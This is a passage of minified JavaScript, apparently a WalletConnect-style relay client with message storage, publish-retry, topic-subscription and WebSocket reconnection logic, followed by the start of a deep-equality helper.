i=this.messages.get(r);return typeof i>"u"&&(i={}),i}),Wn(this,"getWithoutAck",r=>{this.isInitialized();const i={};for(const o of r){const l=this.messagesWithoutClientAck.get(o)||{};i[o]=Object.values(l)}return i}),Wn(this,"has",(r,i)=>{this.isInitialized();const o=this.get(r),l=Xr(i);return typeof o[l]<"u"}),Wn(this,"ack",async(r,i)=>{this.isInitialized();const o=this.messagesWithoutClientAck.get(r);if(typeof o>"u")return;const l=Xr(i);delete o[l],Object.keys(o).length===0?this.messagesWithoutClientAck.delete(r):this.messagesWithoutClientAck.set(r,o),await this.persist()}),Wn(this,"del",async r=>{this.isInitialized(),this.messages.delete(r),this.messagesWithoutClientAck.delete(r),await this.persist()}),this.logger=Sn(e,this.name),this.core=n}get context(){return Fn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get storageKeyWithoutClientAck(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name+"_withoutClientAck"}async setRelayerMessages(e){await this.core.storage.setItem(this.storageKey,ky(e))}async setRelayerMessagesWithoutClientAck(e){await this.core.storage.setItem(this.storageKeyWithoutClientAck,ky(e))}async getRelayerMessages(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?By(e):void 0}async getRelayerMessagesWithoutClientAck(){const e=await this.core.storage.getItem(this.storageKeyWithoutClientAck);return typeof e<"u"?By(e):void 0}async persist(){await this.setRelayerMessages(this.messages),await this.setRelayerMessagesWithoutClientAck(this.messagesWithoutClientAck)}isInitialized(){if(!this.initialized){const{message:e}=Ee("NOT_INITIALIZED",this.name);throw new Error(e)}}};var m9=Object.defineProperty,w9=Object.defineProperties,v9=Object.getOwnPropertyDescriptors,l2=Object.getOwnPropertySymbols,b9=Object.prototype.hasOwnProperty,E9=Object.prototype.propertyIsEnumerable,tm=(t,e,n)=>e in t?m9(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,$h=(t,e)=>{for(var n in e||(e={}))b9.call(e,n)&&tm(t,n,e[n]);if(l2)for(var n of l2(e))E9.call(e,n)&&tm(t,n,e[n]);return t},Fg=(t,e)=>w9(t,v9(e)),Pr=(t,e,n)=>tm(t,typeof e!="symbol"?e+"":e,n);class x9 extends E4{constructor(e,n){super(e,n),this.relayer=e,this.logger=n,Pr(this,"events",new rr.EventEmitter),Pr(this,"name",c6),Pr(this,"queue",new Map),Pr(this,"publishTimeout",be.toMiliseconds(be.ONE_MINUTE)),Pr(this,"initialPublishTimeout",be.toMiliseconds(be.ONE_SECOND*15)),Pr(this,"needsTransportRestart",!1),Pr(this,"publish",async(r,i,o)=>{var l;this.logger.debug("Publishing Payload"),this.logger.trace({type:"method",method:"publish",params:{topic:r,message:i,opts:o}});const c=(o==null?void 0:o.ttl)||XE,u=lf(o),f=(o==null?void 0:o.prompt)||!1,d=(o==null?void 0:o.tag)||0,y=(o==null?void 0:o.id)||Zs().toString(),g={topic:r,message:i,opts:{ttl:c,relay:u,prompt:f,tag:d,id:y,attestation:o==null?void 0:o.attestation,tvf:o==null?void 0:o.tvf}},E=`Failed to publish payload, please try again. id:${y} tag:${d}`;try{const w=new Promise(async b=>{const m=({id:S})=>{g.opts.id===S&&(this.removeRequestFromQueue(S),this.relayer.events.removeListener(Wt.publish,m),b(g))};this.relayer.events.on(Wt.publish,m);const x=gs(new Promise((S,O)=>{this.rpcPublish({topic:r,message:i,ttl:c,prompt:f,tag:d,id:y,attestation:o==null?void 0:o.attestation,tvf:o==null?void 0:o.tvf}).then(S).catch($=>{this.logger.warn($,$==null?void 0:$.message),O($)})}),this.initialPublishTimeout,`Failed initial publish, retrying.... id:${y} tag:${d}`);try{await x,this.events.removeListener(Wt.publish,m)}catch(S){this.queue.set(y,Fg($h({},g),{attempt:1})),this.logger.warn(S,S==null?void 0:S.message)}});this.logger.trace({type:"method",method:"publish",params:{id:y,topic:r,message:i,opts:o}}),await gs(w,this.publishTimeout,E)}catch(w){if(this.logger.debug("Failed to Publish Payload"),this.logger.error(w),(l=o==null?void 0:o.internal)!=null&&l.throwOnFailedPublish)throw w}finally{this.queue.delete(y)}}),Pr(this,"on",(r,i)=>{this.events.on(r,i)}),Pr(this,"once",(r,i)=>{this.events.once(r,i)}),Pr(this,"off",(r,i)=>{this.events.off(r,i)}),Pr(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),this.relayer=e,this.logger=Sn(n,this.name),this.registerEventListeners()}get context(){return Fn(this.logger)}async rpcPublish(e){var n,r,i,o;const{topic:l,message:c,ttl:u=XE,prompt:f,tag:d,id:y,attestation:g,tvf:E}=e,w={method:cc(lf().protocol).publish,params:$h({topic:l,message:c,ttl:u,prompt:f,tag:d,attestation:g},E),id:y};an((n=w.params)==null?void 0:n.prompt)&&((r=w.params)==null||delete r.prompt),an((i=w.params)==null?void 0:i.tag)&&((o=w.params)==null||delete o.tag),this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"message",direction:"outgoing",request:w});const b=await this.relayer.request(w);return this.relayer.events.emit(Wt.publish,e),this.logger.debug("Successfully Published Payload"),b}removeRequestFromQueue(e){this.queue.delete(e)}checkQueue(){this.queue.forEach(async(e,n)=>{const r=e.attempt+1;this.queue.set(n,Fg($h({},e),{attempt:r}));const{topic:i,message:o,opts:l,attestation:c}=e;this.logger.warn({},`Publisher: queue->publishing: ${e.opts.id}, tag: ${e.opts.tag}, attempt: ${r}`),await this.rpcPublish(Fg($h({},e),{topic:i,message:o,ttl:l.ttl,prompt:l.prompt,tag:l.tag,id:l.id,attestation:c,tvf:l.tvf})),this.logger.warn({},`Publisher: queue->published: ${e.opts.id}`)})}registerEventListeners(){this.relayer.core.heartbeat.on(fo.pulse,()=>{if(this.needsTransportRestart){this.needsTransportRestart=!1,this.relayer.events.emit(Wt.connection_stalled);return}this.checkQueue()}),this.relayer.on(Wt.message_ack,e=>{this.removeRequestFromQueue(e.id.toString())})}}var S9=Object.defineProperty,_9=(t,e,n)=>e in t?S9(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Jo=(t,e,n)=>_9(t,typeof e!="symbol"?e+"":e,n);class I9{constructor(){Jo(this,"map",new Map),Jo(this,"set",(e,n)=>{const r=this.get(e);this.exists(e,n)||this.map.set(e,[...r,n])}),Jo(this,"get",e=>this.map.get(e)||[]),Jo(this,"exists",(e,n)=>this.get(e).includes(n)),Jo(this,"delete",(e,n)=>{if(typeof n>"u"){this.map.delete(e);return}if(!this.map.has(e))return;const r=this.get(e);if(!this.exists(e,n))return;const i=r.filter(o=>o!==n);if(!i.length){this.map.delete(e);return}this.map.set(e,i)}),Jo(this,"clear",()=>{this.map.clear()})}get topics(){return Array.from(this.map.keys())}}var O9=Object.defineProperty,$9=Object.defineProperties,P9=Object.getOwnPropertyDescriptors,c2=Object.getOwnPropertySymbols,T9=Object.prototype.hasOwnProperty,A9=Object.prototype.propertyIsEnumerable,nm=(t,e,n)=>e in t?O9(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,nc=(t,e)=>{for(var n in e||(e={}))T9.call(e,n)&&nm(t,n,e[n]);if(c2)for(var n of c2(e))A9.call(e,n)&&nm(t,n,e[n]);return t},zg=(t,e)=>$9(t,P9(e)),rt=(t,e,n)=>nm(t,typeof e!="symbol"?e+"":e,n);let C9=class extends _4{constructor(e,n){super(e,n),this.relayer=e,this.logger=n,rt(this,"subscriptions",new Map),rt(this,"topicMap",new I9),rt(this,"events",new rr.EventEmitter),rt(this,"name",y6),rt(this,"version",m6),rt(this,"pending",new Map),rt(this,"cached",[]),rt(this,"initialized",!1),rt(this,"storagePrefix",ti),rt(this,"subscribeTimeout",be.toMiliseconds(be.ONE_MINUTE)),rt(this,"initialSubscribeTimeout",be.toMiliseconds(be.ONE_SECOND*15)),rt(this,"clientId"),rt(this,"batchSubscribeTopicsLimit",500),rt(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),this.registerEventListeners(),await this.restore()),this.initialized=!0}),rt(this,"subscribe",async(r,i)=>{this.isInitialized(),this.logger.debug("Subscribing Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:r,opts:i}});try{const o=lf(i),l={topic:r,relay:o,transportType:i==null?void 0:i.transportType};this.pending.set(r,l);const c=await this.rpcSubscribe(r,o,i);return typeof c=="string"&&(this.onSubscribe(c,l),this.logger.debug("Successfully Subscribed Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:r,opts:i}})),c}catch(o){throw this.logger.debug("Failed to Subscribe Topic"),this.logger.error(o),o}}),rt(this,"unsubscribe",async(r,i)=>{this.isInitialized(),typeof(i==null?void 0:i.id)<"u"?await this.unsubscribeById(r,i.id,i):await this.unsubscribeByTopic(r,i)}),rt(this,"isSubscribed",r=>new Promise(i=>{i(this.topicMap.topics.includes(r))})),rt(this,"isKnownTopic",r=>new Promise(i=>{i(this.topicMap.topics.includes(r)||this.pending.has(r)||this.cached.some(o=>o.topic===r))})),rt(this,"on",(r,i)=>{this.events.on(r,i)}),rt(this,"once",(r,i)=>{this.events.once(r,i)}),rt(this,"off",(r,i)=>{this.events.off(r,i)}),rt(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),rt(this,"start",async()=>{await this.onConnect()}),rt(this,"stop",async()=>{await this.onDisconnect()}),rt(this,"restart",async()=>{await this.restore(),await this.onRestart()}),rt(this,"checkPending",async()=>{if(this.pending.size===0&&(!this.initialized||!this.relayer.connected))return;const r=[];this.pending.forEach(i=>{r.push(i)}),await this.batchSubscribe(r)}),rt(this,"registerEventListeners",()=>{this.relayer.core.heartbeat.on(fo.pulse,async()=>{await this.checkPending()}),this.events.on(Gn.created,async r=>{const i=Gn.created;this.logger.info(`Emitting ${i}`),this.logger.debug({type:"event",event:i,data:r}),await this.persist()}),this.events.on(Gn.deleted,async r=>{const i=Gn.deleted;this.logger.info(`Emitting ${i}`),this.logger.debug({type:"event",event:i,data:r}),await this.persist()})}),this.relayer=e,this.logger=Sn(n,this.name),this.clientId=""}get context(){return Fn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.relayer.core.customStoragePrefix+"//"+this.name}get length(){return this.subscriptions.size}get ids(){return Array.from(this.subscriptions.keys())}get values(){return Array.from(this.subscriptions.values())}get topics(){return this.topicMap.topics}get hasAnyTopics(){return this.topicMap.topics.length>0||this.pending.size>0||this.cached.length>0||this.subscriptions.size>0}hasSubscription(e,n){let r=!1;try{r=this.getSubscription(e).topic===n}catch{}return r}reset(){this.cached=[],this.initialized=!0}onDisable(){this.values.length>0&&(this.cached=this.values),this.subscriptions.clear(),this.topicMap.clear()}async unsubscribeByTopic(e,n){const r=this.topicMap.get(e);await Promise.all(r.map(async i=>await this.unsubscribeById(e,i,n)))}async unsubscribeById(e,n,r){this.logger.debug("Unsubscribing Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:n,opts:r}});try{const i=lf(r);await this.restartToComplete({topic:e,id:n,relay:i}),await this.rpcUnsubscribe(e,n,i);const o=ut("USER_DISCONNECTED",`${this.name}, ${e}`);await this.onUnsubscribe(e,n,o),this.logger.debug("Successfully Unsubscribed Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:n,opts:r}})}catch(i){throw this.logger.debug("Failed to Unsubscribe Topic"),this.logger.error(i),i}}async rpcSubscribe(e,n,r){var i;(!r||(r==null?void 0:r.transportType)===dt.relay)&&await this.restartToComplete({topic:e,id:e,relay:n});const o={method:cc(n.protocol).subscribe,params:{topic:e}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:o});const l=(i=r==null?void 0:r.internal)==null?void 0:i.throwOnFailedPublish;try{const c=await this.getSubscriptionId(e);if((r==null?void 0:r.transportType)===dt.link_mode)return setTimeout(()=>{(this.relayer.connected||this.relayer.connecting)&&this.relayer.request(o).catch(d=>this.logger.warn(d))},be.toMiliseconds(be.ONE_SECOND)),c;const u=new Promise(async d=>{const y=g=>{g.topic===e&&(this.events.removeListener(Gn.created,y),d(g.id))};this.events.on(Gn.created,y);try{const g=await gs(new Promise((E,w)=>{this.relayer.request(o).catch(b=>{this.logger.warn(b,b==null?void 0:b.message),w(b)}).then(E)}),this.initialSubscribeTimeout,`Subscribing to ${e} failed, please try again`);this.events.removeListener(Gn.created,y),d(g)}catch{}}),f=await gs(u,this.subscribeTimeout,`Subscribing to ${e} failed, please try again`);if(!f&&l)throw new Error(`Subscribing to ${e} failed, please try again`);return f?c:null}catch(c){if(this.logger.debug("Outgoing Relay Subscribe Payload stalled"),this.relayer.events.emit(Wt.connection_stalled),l)throw c}return null}async rpcBatchSubscribe(e){if(!e.length)return;const n=e[0].relay,r={method:cc(n.protocol).batchSubscribe,params:{topics:e.map(i=>i.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:r});try{await await gs(new Promise(i=>{this.relayer.request(r).catch(o=>this.logger.warn(o)).then(i)}),this.subscribeTimeout,"rpcBatchSubscribe failed, please try again")}catch{this.relayer.events.emit(Wt.connection_stalled)}}async rpcBatchFetchMessages(e){if(!e.length)return;const n=e[0].relay,r={method:cc(n.protocol).batchFetchMessages,params:{topics:e.map(o=>o.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:r});let i;try{i=await await gs(new Promise((o,l)=>{this.relayer.request(r).catch(c=>{this.logger.warn(c),l(c)}).then(o)}),this.subscribeTimeout,"rpcBatchFetchMessages failed, please try again")}catch{this.relayer.events.emit(Wt.connection_stalled)}return i}rpcUnsubscribe(e,n,r){const i={method:cc(r.protocol).unsubscribe,params:{topic:e,id:n}};return this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:i}),this.relayer.request(i)}onSubscribe(e,n){this.setSubscription(e,zg(nc({},n),{id:e})),this.pending.delete(n.topic)}onBatchSubscribe(e){e.length&&e.forEach(n=>{this.setSubscription(n.id,nc({},n)),this.pending.delete(n.topic)})}async onUnsubscribe(e,n,r){this.events.removeAllListeners(n),this.hasSubscription(n,e)&&this.deleteSubscription(n,r),await this.relayer.messages.del(e)}async setRelayerSubscriptions(e){await this.relayer.core.storage.setItem(this.storageKey,e)}async getRelayerSubscriptions(){return await this.relayer.core.storage.getItem(this.storageKey)}setSubscription(e,n){this.logger.debug("Setting subscription"),this.logger.trace({type:"method",method:"setSubscription",id:e,subscription:n}),this.addSubscription(e,n)}addSubscription(e,n){this.subscriptions.set(e,nc({},n)),this.topicMap.set(n.topic,e),this.events.emit(Gn.created,n)}getSubscription(e){this.logger.debug("Getting subscription"),this.logger.trace({type:"method",method:"getSubscription",id:e});const n=this.subscriptions.get(e);if(!n){const{message:r}=Ee("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(r)}return n}deleteSubscription(e,n){this.logger.debug("Deleting subscription"),this.logger.trace({type:"method",method:"deleteSubscription",id:e,reason:n});const r=this.getSubscription(e);this.subscriptions.delete(e),this.topicMap.delete(r.topic,e),this.events.emit(Gn.deleted,zg(nc({},r),{reason:n}))}async persist(){await this.setRelayerSubscriptions(this.values),this.events.emit(Gn.sync)}async onRestart(){if(this.cached.length){const e=[...this.cached],n=Math.ceil(this.cached.length/this.batchSubscribeTopicsLimit);for(let r=0;r<n;r++){const i=e.splice(0,this.batchSubscribeTopicsLimit);await this.batchSubscribe(i)}}this.events.emit(Gn.resubscribed)}async restore(){try{const e=await this.getRelayerSubscriptions();if(typeof e>"u"||!e.length)return;if(this.subscriptions.size){const{message:n}=Ee("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),this.logger.error(`${this.name}: ${JSON.stringify(this.values)}`),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored subscriptions for ${this.name}`),this.logger.trace({type:"method",method:"restore",subscriptions:this.values})}catch(e){this.logger.debug(`Failed to Restore subscriptions for ${this.name}`),this.logger.error(e)}}async batchSubscribe(e){e.length&&(await this.rpcBatchSubscribe(e),this.onBatchSubscribe(await Promise.all(e.map(async n=>zg(nc({},n),{id:await this.getSubscriptionId(n.topic)})))))}async batchFetchMessages(e){if(!e.length)return;this.logger.trace(`Fetching batch messages for ${e.length} subscriptions`);const n=await this.rpcBatchFetchMessages(e);n&&n.messages&&(await QB(be.toMiliseconds(be.ONE_SECOND)),await this.relayer.handleBatchMessageEvents(n.messages))}async onConnect(){await this.restart(),this.reset()}onDisconnect(){this.onDisable()}isInitialized(){if(!this.initialized){const{message:e}=Ee("NOT_INITIALIZED",this.name);throw new Error(e)}}async restartToComplete(e){!this.relayer.connected&&!this.relayer.connecting&&(this.cached.push(e),await this.relayer.transportOpen())}async getClientId(){return this.clientId||(this.clientId=await this.relayer.core.crypto.getClientId()),this.clientId}async getSubscriptionId(e){return Xr(e+await this.getClientId())}};var R9=Object.defineProperty,u2=Object.getOwnPropertySymbols,D9=Object.prototype.hasOwnProperty,N9=Object.prototype.propertyIsEnumerable,rm=(t,e,n)=>e in t?R9(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,h2=(t,e)=>{for(var n in e||(e={}))D9.call(e,n)&&rm(t,n,e[n]);if(u2)for(var n of u2(e))N9.call(e,n)&&rm(t,n,e[n]);return t},We=(t,e,n)=>rm(t,typeof e!="symbol"?e+"":e,n);class k9 extends x4{constructor(e){super(e),We(this,"protocol","wc"),We(this,"version",2),We(this,"core"),We(this,"logger"),We(this,"events",new rr.EventEmitter),We(this,"provider"),We(this,"messages"),We(this,"subscriber"),We(this,"publisher"),We(this,"name",h6),We(this,"transportExplicitlyClosed",!1),We(this,"initialized",!1),We(this,"connectionAttemptInProgress",!1),We(this,"relayUrl"),We(this,"projectId"),We(this,"packageName"),We(this,"bundleId"),We(this,"hasExperiencedNetworkDisruption",!1),We(this,"pingTimeout"),We(this,"heartBeatTimeout",be.toMiliseconds(be.THIRTY_SECONDS+be.FIVE_SECONDS)),We(this,"reconnectTimeout"),We(this,"connectPromise"),We(this,"reconnectInProgress",!1),We(this,"requestsInFlight",[]),We(this,"connectTimeout",be.toMiliseconds(be.ONE_SECOND*15)),We(this,"request",async n=>{var r,i;this.logger.debug("Publishing Request Payload");const o=n.id||Zs().toString();await this.toEstablishConnection();try{this.logger.trace({id:o,method:n.method,topic:(r=n.params)==null?void 0:r.topic},"relayer.request - publishing...");const l=`${o}:${((i=n.params)==null?void 0:i.tag)||""}`;this.requestsInFlight.push(l);const c=await this.provider.request(n);return this.requestsInFlight=this.requestsInFlight.filter(u=>u!==l),c}catch(l){throw this.logger.debug(`Failed to Publish Request: ${o}`),l}}),We(this,"resetPingTimeout",()=>{of()&&(clearTimeout(this.pingTimeout),this.pingTimeout=setTimeout(()=>{var n,r,i,o;try{this.logger.debug({},"pingTimeout: Connection stalled, terminating..."),(o=(i=(r=(n=this.provider)==null?void 0:n.connection)==null?void 0:r.socket)==null?void 0:i.terminate)==null||o.call(i)}catch(l){this.logger.warn(l,l==null?void 0:l.message)}},this.heartBeatTimeout))}),We(this,"onPayloadHandler",n=>{this.onProviderPayload(n),this.resetPingTimeout()}),We(this,"onConnectHandler",()=>{this.logger.warn({},"Relayer connected 🛜"),this.startPingTimeout(),this.events.emit(Wt.connect)}),We(this,"onDisconnectHandler",()=>{this.logger.warn({},"Relayer disconnected 🛑"),this.requestsInFlight=[],this.onProviderDisconnect()}),We(this,"onProviderErrorHandler",n=>{this.logger.fatal(`Fatal socket error: ${n.message}`),this.events.emit(Wt.error,n),this.logger.fatal("Fatal socket error received, closing transport"),this.transportClose()}),We(this,"registerProviderListeners",()=>{this.provider.on(ur.payload,this.onPayloadHandler),this.provider.on(ur.connect,this.onConnectHandler),this.provider.on(ur.disconnect,this.onDisconnectHandler),this.provider.on(ur.error,this.onProviderErrorHandler)}),this.core=e.core,this.logger=typeof e.logger<"u"&&typeof e.logger!="string"?Sn(e.logger,this.name):Uc(Af({level:e.logger||u6})),this.messages=new y9(this.logger,e.core),this.subscriber=new C9(this,this.logger),this.publisher=new x9(this,this.logger),this.relayUrl=(e==null?void 0:e.relayUrl)||SI,this.projectId=e.projectId,kB()?this.packageName=iE():BB()&&(this.bundleId=iE()),this.provider={}}async init(){if(this.logger.trace("Initialized"),this.registerEventListeners(),await Promise.all([this.messages.init(),this.subscriber.init()]),this.initialized=!0,this.subscriber.hasAnyTopics)try{await this.transportOpen()}catch(e){this.logger.warn(e,e==null?void 0:e.message)}}get context(){return Fn(this.logger)}get connected(){var e,n,r;return((r=(n=(e=this.provider)==null?void 0:e.connection)==null?void 0:n.socket)==null?void 0:r.readyState)===1||!1}get connecting(){var e,n,r;return((r=(n=(e=this.provider)==null?void 0:e.connection)==null?void 0:n.socket)==null?void 0:r.readyState)===0||this.connectPromise!==void 0||!1}async publish(e,n,r){this.isInitialized(),await this.publisher.publish(e,n,r),await this.recordMessageEvent({topic:e,message:n,publishedAt:Date.now(),transportType:dt.relay},Vh.outbound)}async subscribe(e,n){var r,i,o;this.isInitialized(),(!(n!=null&&n.transportType)||(n==null?void 0:n.transportType)==="relay")&&await this.toEstablishConnection();const l=typeof((r=n==null?void 0:n.internal)==null?void 0:r.throwOnFailedPublish)>"u"?!0:(i=n==null?void 0:n.internal)==null?void 0:i.throwOnFailedPublish;let c=((o=this.subscriber.topicMap.get(e))==null?void 0:o[0])||"",u;const f=d=>{d.topic===e&&(this.subscriber.off(Gn.created,f),u())};return await Promise.all([new Promise(d=>{u=d,this.subscriber.on(Gn.created,f)}),new Promise(async(d,y)=>{c=await this.subscriber.subscribe(e,h2({internal:{throwOnFailedPublish:l}},n)).catch(g=>{l&&y(g)})||c,d()})]),c}async unsubscribe(e,n){this.isInitialized(),await this.subscriber.unsubscribe(e,n)}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async transportDisconnect(){this.provider.disconnect&&(this.hasExperiencedNetworkDisruption||this.connected)?await gs(this.provider.disconnect(),2e3,"provider.disconnect()").catch(()=>this.onProviderDisconnect()):this.onProviderDisconnect()}async transportClose(){this.transportExplicitlyClosed=!0,await this.transportDisconnect()}async transportOpen(e){if(!this.subscriber.hasAnyTopics){this.logger.warn("Starting WS connection skipped because the client has no topics to work with.");return}if(this.connectPromise?(this.logger.debug({},"Waiting for existing connection attempt to resolve..."),await this.connectPromise,this.logger.debug({},"Existing connection attempt resolved")):(this.connectPromise=new Promise(async(n,r)=>{await this.connect(e).then(n).catch(r).finally(()=>{this.connectPromise=void 0})}),await this.connectPromise),!this.connected)throw new Error(`Couldn't establish socket connection to the relay server: ${this.relayUrl}`)}async restartTransport(e){this.logger.debug({},"Restarting transport..."),!this.connectionAttemptInProgress&&(this.relayUrl=e||this.relayUrl,await this.confirmOnlineStateOrThrow(),await this.transportClose(),await this.transportOpen())}async confirmOnlineStateOrThrow(){if(!await qE())throw new Error("No internet connection detected. Please restart your network and try again.")}async handleBatchMessageEvents(e){if((e==null?void 0:e.length)===0){this.logger.trace("Batch message events is empty. Ignoring...");return}const n=e.sort((r,i)=>r.publishedAt-i.publishedAt);this.logger.debug(`Batch of ${n.length} message events sorted`);for(const r of n)try{await this.onMessageEvent(r)}catch(i){this.logger.warn(i,"Error while processing batch message event: "+(i==null?void 0:i.message))}this.logger.trace(`Batch of ${n.length} message events processed`)}async onLinkMessageEvent(e,n){const{topic:r}=e;if(!n.sessionExists){const i=Nt(be.FIVE_MINUTES),o={topic:r,expiry:i,relay:{protocol:"irn"},active:!1};await this.core.pairing.pairings.set(r,o)}this.events.emit(Wt.message,e),await this.recordMessageEvent(e,Vh.inbound)}async connect(e){await this.confirmOnlineStateOrThrow(),e&&e!==this.relayUrl&&(this.relayUrl=e,await this.transportDisconnect()),this.connectionAttemptInProgress=!0,this.transportExplicitlyClosed=!1;let n=1;for(;n<6;){try{if(this.transportExplicitlyClosed)break;this.logger.debug({},`Connecting to ${this.relayUrl}, attempt: ${n}...`),await this.createProvider(),await new Promise(async(r,i)=>{const o=()=>{i(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(ur.disconnect,o),await gs(new Promise((l,c)=>{this.provider.connect().then(l).catch(c)}),this.connectTimeout,`Socket stalled when trying to connect to ${this.relayUrl}`).catch(l=>{i(l)}).finally(()=>{this.provider.off(ur.disconnect,o),clearTimeout(this.reconnectTimeout)}),await new Promise(async(l,c)=>{const u=()=>{c(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(ur.disconnect,u),await this.subscriber.start().then(l).catch(c).finally(()=>{this.provider.off(ur.disconnect,u)})}),this.hasExperiencedNetworkDisruption=!1,r()})}catch(r){await this.subscriber.stop();const i=r;this.logger.warn({},i.message),this.hasExperiencedNetworkDisruption=!0}finally{this.connectionAttemptInProgress=!1}if(this.connected){this.logger.debug({},`Connected to ${this.relayUrl} successfully on attempt: ${n}`);break}await new Promise(r=>setTimeout(r,be.toMiliseconds(n*1))),n++}}startPingTimeout(){var e,n,r,i,o;if(of())try{(n=(e=this.provider)==null?void 0:e.connection)!=null&&n.socket&&((o=(i=(r=this.provider)==null?void 0:r.connection)==null?void 0:i.socket)==null||o.on("ping",()=>{this.resetPingTimeout()})),this.resetPingTimeout()}catch(l){this.logger.warn(l,l==null?void 0:l.message)}}async createProvider(){this.provider.connection&&this.unregisterProviderListeners();const e=await this.core.crypto.signJWT(this.relayUrl);this.provider=new gr(new XU(FB({sdkVersion:Zy,protocol:this.protocol,version:this.version,relayUrl:this.relayUrl,projectId:this.projectId,auth:e,useOnCloseEvent:!0,bundleId:this.bundleId,packageName:this.packageName}))),this.registerProviderListeners()}async recordMessageEvent(e,n){const{topic:r,message:i}=e;await this.messages.set(r,i,n)}async shouldIgnoreMessageEvent(e){const{topic:n,message:r}=e;if(!r||r.length===0)return this.logger.warn(`Ignoring invalid/empty message: ${r}`),!0;if(!await this.subscriber.isKnownTopic(n))return this.logger.warn(`Ignoring message for unknown topic ${n}`),!0;const i=this.messages.has(n,r);return i&&this.logger.warn(`Ignoring duplicate message: ${r}`),i}async onProviderPayload(e){if(this.logger.debug("Incoming Relay Payload"),this.logger.trace({type:"payload",direction:"incoming",payload:e}),cw(e)){if(!e.method.endsWith(f6))return;const n=e.params,{topic:r,message:i,publishedAt:o,attestation:l}=n.data,c={topic:r,message:i,publishedAt:o,transportType:dt.relay,attestation:l};this.logger.debug("Emitting Relayer Payload"),this.logger.trace(h2({type:"event",event:n.id},c)),this.events.emit(n.id,c),await this.acknowledgePayload(e),await this.onMessageEvent(c)}else Uf(e)&&this.events.emit(Wt.message_ack,e)}async onMessageEvent(e){await this.shouldIgnoreMessageEvent(e)||(await this.recordMessageEvent(e,Vh.inbound),this.events.emit(Wt.message,e))}async acknowledgePayload(e){const n=Lf(e.id,!0);await this.provider.connection.send(n)}unregisterProviderListeners(){this.provider.off(ur.payload,this.onPayloadHandler),this.provider.off(ur.connect,this.onConnectHandler),this.provider.off(ur.disconnect,this.onDisconnectHandler),this.provider.off(ur.error,this.onProviderErrorHandler),clearTimeout(this.pingTimeout)}async registerEventListeners(){let e=await qE();nU(async n=>{e!==n&&(e=n,n?await this.transportOpen().catch(r=>this.logger.error(r,r==null?void 0:r.message)):(this.hasExperiencedNetworkDisruption=!0,await this.transportDisconnect(),this.transportExplicitlyClosed=!1))}),this.core.heartbeat.on(fo.pulse,async()=>{if(!this.transportExplicitlyClosed&&!this.connected&&sU())try{await this.confirmOnlineStateOrThrow(),await this.transportOpen()}catch(n){this.logger.warn(n,n==null?void 0:n.message)}})}async onProviderDisconnect(){clearTimeout(this.pingTimeout),this.events.emit(Wt.disconnect),this.connectionAttemptInProgress=!1,!this.reconnectInProgress&&(this.reconnectInProgress=!0,await this.subscriber.stop(),this.subscriber.hasAnyTopics&&(this.transportExplicitlyClosed||(this.reconnectTimeout=setTimeout(async()=>{await this.transportOpen().catch(e=>this.logger.error(e,e==null?void 0:e.message)),this.reconnectTimeout=void 0,this.reconnectInProgress=!1},be.toMiliseconds(d6)))))}isInitialized(){if(!this.initialized){const{message:e}=Ee("NOT_INITIALIZED",this.name);throw new Error(e)}}async toEstablishConnection(){if(await this.confirmOnlineStateOrThrow(),!this.connected){if(this.connectPromise){await this.connectPromise;return}await this.connect()}}}function B9(){}function f2(t){if(!t||typeof t!="object")return!1;const e=Object.getPrototypeOf(t);return e===null||e===Object.prototype||Object.getPrototypeOf(e)===null?Object.prototype.toString.call(t)==="[object Object]":!1}function d2(t){return Object.getOwnPropertySymbols(t).filter(e=>Object.prototype.propertyIsEnumerable.call(t,e))}function p2(t){return t==null?t===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(t)}const L9="[object RegExp]",j9="[object String]",U9="[object Number]",M9="[object Boolean]",g2="[object Arguments]",F9="[object Symbol]",z9="[object Date]",q9="[object Map]",H9="[object Set]",V9="[object Array]",W9="[object Function]",K9="[object ArrayBuffer]",qg="[object Object]",G9="[object Error]",Y9="[object DataView]",J9="[object Uint8Array]",Z9="[object Uint8ClampedArray]",Q9="[object Uint16Array]",X9="[object Uint32Array]",eF="[object BigUint64Array]",tF="[object Int8Array]",nF="[object Int16Array]",rF="[object Int32Array]",iF="[object BigInt64Array]",sF="[object Float32Array]",oF="[object Float64Array]";function aF(t,e){return t===e||Number.isNaN(t)&&Number.isNaN(e)}function lF(t,e,n){return uc(t,e,void 0,void 0,void 0,void 0,n)}function uc(t,e,n,r,i,o,l){const c=l(t,e,n,r,i,o);if(c!==void 0)return c;if(typeof t==typeof e)switch(typeof t){case"bigint":case"string":case"boolean":case"symbol":case"undefined":return t===e;case"number":return t===e||Object.is(t,e);case"function":return t===e;case"object":return yc(t,e,o,l)}return yc(t,e,o,l)}function 